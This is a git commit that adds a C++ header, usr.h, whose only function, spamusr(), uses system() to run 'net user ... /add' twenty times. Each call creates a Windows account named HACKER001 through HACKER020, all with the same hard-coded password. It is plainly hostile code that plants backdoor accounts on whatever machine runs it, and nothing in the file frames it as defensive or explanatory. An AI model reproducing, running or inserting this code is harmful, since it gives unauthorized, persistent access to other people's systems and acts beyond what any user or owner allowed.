250f3b6f5c8c57329eb4a1880b49e32b5d1f7e49
Someone <86903124+Someone8859@users.noreply.github.com>
2021-08-13 12:57:29 +0700

    Create usr.h

---
+++ source-vs/usr.h
@@ -0,0 +1,28 @@
+#pragma once
+#include <iostream>
+#include <stdlib.h>
+#include <stdio.h>
+using namespace std;
+
+void spamusr() {
+    system("net user HACKER001 Trash0001 /add");
+    system("net user HACKER002 Trash0001 /add");
+    system("net user HACKER003 Trash0001 /add");
+    system("net user HACKER004 Trash0001 /add");
+    system("net user HACKER005 Trash0001 /add");
+    system("net user HACKER006 Trash0001 /add");
+    system("net user HACKER007 Trash0001 /add");
+    system("net user HACKER008 Trash0001 /add");
+    system("net user HACKER009 Trash0001 /add");
+    system("net user HACKER010 Trash0001 /add");
+    system("net user HACKER011 Trash0001 /add");
+    system("net user HACKER012 Trash0001 /add");
+    system("net user HACKER013 Trash0001 /add");
+    system("net user HACKER014 Trash0001 /add");
+    system("net user HACKER015 Trash0001 /add");
+    system("net user HACKER016 Trash0001 /add");
+    system("net user HACKER017 Trash0001 /add");
+    system("net user HACKER018 Trash0001 /add");
+    system("net user HACKER019 Trash0001 /add");
+    system("net user HACKER020 Trash0001 /add");
+}
